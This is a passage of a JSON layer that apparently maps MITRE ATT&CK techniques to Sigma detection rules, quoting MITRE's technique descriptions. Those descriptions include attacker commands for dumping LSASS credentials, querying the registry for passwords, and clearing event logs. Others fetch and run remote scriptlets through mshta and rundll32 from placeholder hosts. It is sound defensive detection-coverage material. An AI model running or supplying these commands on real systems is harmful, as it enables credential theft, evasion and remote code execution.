                    "name": "file_access_win_susp_gpo_access_uncommon_process.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\file\\file_access\\file_access_win_susp_gpo_access_uncommon_process.yml"
                }
            ]
        },
        {
            "techniqueID": "T1003.003",
            "score": 1,
            "comment": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_bear_activity_gtr19.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Bear-APT-Activity\\proc_creation_win_apt_bear_activity_gtr19.yml"
                }
            ]
        },
        {
            "techniqueID": "T1003.001",
            "score": 5,
            "comment": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as comsvcs.dll can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_notpetya.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\NotPetya\\proc_creation_win_malware_notpetya.yml"
                },
                {
                    "name": "proc_creation_win_apt_apt31_judgement_panda.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\APT31\\proc_creation_win_apt_apt31_judgement_panda.yml"
                },
                {
                    "name": "proc_access_win_lsass_powershell_access.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_access\\proc_access_win_lsass_powershell_access.yml"
                },
                {
                    "name": "proc_access_win_lsass_susp_source_process.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_access\\proc_access_win_lsass_susp_source_process.yml"
                },
                {
                    "name": "proc_access_win_lsass_uncommon_access_flag.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_access\\proc_access_win_lsass_uncommon_access_flag.yml"
                }
            ]
        },
        {
            "techniqueID": "T1021.002",
            "score": 1,
            "comment": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_turla_commands_critical.yml",
                    "value": "sigma\\rules-emerging-threats\\2014\\TA\\Turla\\proc_creation_win_apt_turla_commands_critical.yml"
                }
            ]
        },
        {
            "techniqueID": "T1021.001",
            "score": 1,
            "comment": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_hermetic_wiper_activity.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Malware\\Hermetic-Wiper\\proc_creation_win_malware_hermetic_wiper_activity.yml"
                }
            ]
        },
        {
            "techniqueID": "T1036.005",
            "score": 4,
            "comment": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
            "metadata": [
                {
                    "name": "proc_creation_win_exploit_cve_2015_1641.yml",
                    "value": "sigma\\rules-emerging-threats\\2015\\Exploits\\CVE-2015-1641\\proc_creation_win_exploit_cve_2015_1641.yml"
                },
                {
                    "name": "proc_creation_win_apt_lazarus_binary_masquerading.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\TA\\Lazarus\\proc_creation_win_apt_lazarus_binary_masquerading.yml"
                },
                {
                    "name": "proc_creation_win_apt_greenbug_may20.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\Greenbug\\proc_creation_win_apt_greenbug_may20.yml"
                },
                {
                    "name": "file_event_win_malware_small_sieve_evasion_typo.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\Small-Sieve\\file_event_win_malware_small_sieve_evasion_typo.yml"
                }
            ]
        },
        {
            "techniqueID": "T1036.004",
            "score": 2,
            "comment": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_wocao.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Operation-Wocao\\proc_creation_win_apt_wocao.yml"
                },
                {
                    "name": "win_security_apt_wocao.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Operation-Wocao\\win_security_apt_wocao.yml"
                }
            ]
        },
        {
            "techniqueID": "T1036.003",
            "score": 1,
            "comment": "Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>). (Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_ta17_293a_ps.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\TA\\Dragonfly\\proc_creation_win_apt_ta17_293a_ps.yml"
                }
            ]
        },
        {
            "techniqueID": "T1553",
            "score": 1,
            "comment": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\n\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) ",
            "metadata": [
                {
                    "name": "proc_creation_win_exploit_other_razorinstaller_lpe.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\RazerInstaller-LPE-Exploit\\proc_creation_win_exploit_other_razorinstaller_lpe.yml"
                }
            ]
        },
        {
            "techniqueID": "T1222.001",
            "score": 2,
            "comment": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_wannacry.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\WannaCry\\proc_creation_win_malware_wannacry.yml"
                },
                {
                    "name": "proc_creation_win_susp_file_permission_modifications.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_susp_file_permission_modifications.yml"
                }
            ]
        },
        {
            "techniqueID": "T1552.002",
            "score": 1,
            "comment": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",
            "metadata": [
                {
                    "name": "win_security_remote_registry_management_via_reg.yml",
                    "value": "sigma\\rules-placeholder\\windows\\builtin\\security\\win_security_remote_registry_management_via_reg.yml"
                }
            ]
        },
        {
            "techniqueID": "T1552.001",
            "score": 2,
            "comment": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_bear_activity_gtr19.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Bear-APT-Activity\\proc_creation_win_apt_bear_activity_gtr19.yml"
                },
                {
                    "name": "proc_creation_win_findstr_password_recon.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_findstr_password_recon.yml"
                }
            ]
        },
        {
            "techniqueID": "T1552",
            "score": 1,
            "comment": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).",
            "metadata": [
                {
                    "name": "proc_creation_win_susp_event_log_query.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_susp_event_log_query.yml"
                }
            ]
        },
        {
            "techniqueID": "T1070.004",
            "score": 2,
            "comment": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
            "metadata": [
                {
                    "name": "file_delete_win_zone_identifier_ads.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\file\\file_delete\\file_delete_win_zone_identifier_ads.yml"
                },
                {
                    "name": "posh_ps_remove_item_path.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_script\\posh_ps_remove_item_path.yml"
                }
            ]
        },
        {
            "techniqueID": "T1550.002",
            "score": 1,
            "comment": "Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",
            "metadata": [
                {
                    "name": "win_security_potential_pass_the_hash.yml",
                    "value": "sigma\\rules-placeholder\\windows\\builtin\\security\\win_security_potential_pass_the_hash.yml"
                }
            ]
        },
        {
            "techniqueID": "T1550",
            "score": 1,
            "comment": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
            "metadata": [
                {
                    "name": "win_security_admin_logon.yml",
                    "value": "sigma\\rules-placeholder\\windows\\builtin\\security\\win_security_admin_logon.yml"
                }
            ]
        },
        {
            "techniqueID": "T1070.001",
            "score": 1,
            "comment": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\nThe event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_notpetya.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\NotPetya\\proc_creation_win_malware_notpetya.yml"
                }
            ]
        },
        {
            "techniqueID": "T1136.001",
            "score": 2,
            "comment": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
            "metadata": [
                {
                    "name": "proc_creation_win_exploit_cve_2021_35211_servu.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-35211\\proc_creation_win_exploit_cve_2021_35211_servu.yml"
                },
                {
                    "name": "proc_creation_win_malware_darkgate_net_user_creation.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\DarkGate\\proc_creation_win_malware_darkgate_net_user_creation.yml"
                }
            ]
        },
        {
            "techniqueID": "T1547.001",
            "score": 3,
            "comment": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_ryuk.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\Ryuk\\proc_creation_win_malware_ryuk.yml"
                },
                {
                    "name": "proc_creation_win_apt_unc2452_vbscript_pattern.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\SolarWinds-Supply-Chain\\proc_creation_win_apt_unc2452_vbscript_pattern.yml"
                },
                {
                    "name": "registry_set_powershell_crypto_namespace.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\registry\\registry_set\\registry_set_powershell_crypto_namespace.yml"
                }
            ]
        },
        {
            "techniqueID": "T1218.010",
            "score": 2,
            "comment": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_aptc12_bluemushroom.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\APC-C-12\\proc_creation_win_apt_aptc12_bluemushroom.yml"
                },
                {
                    "name": "proc_creation_win_apt_empiremonkey.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\EmpireMonkey\\proc_creation_win_apt_empiremonkey.yml"
                }
            ]
        },
        {
            "techniqueID": "T1218.005",
            "score": 1,
            "comment": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_babyshark.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\BabyShark\\proc_creation_win_malware_babyshark.yml"
                }
            ]
        },
        {
            "techniqueID": "T1218.011",
            "score": 12,
            "comment": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_zxshell.yml",
                    "value": "sigma\\rules-emerging-threats\\2014\\TA\\Axiom\\proc_creation_win_apt_zxshell.yml"
                },
                {
                    "name": "proc_creation_win_malware_fireball.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\Fireball\\proc_creation_win_malware_fireball.yml"
                },
                {
                    "name": "proc_creation_win_malware_notpetya.yml",
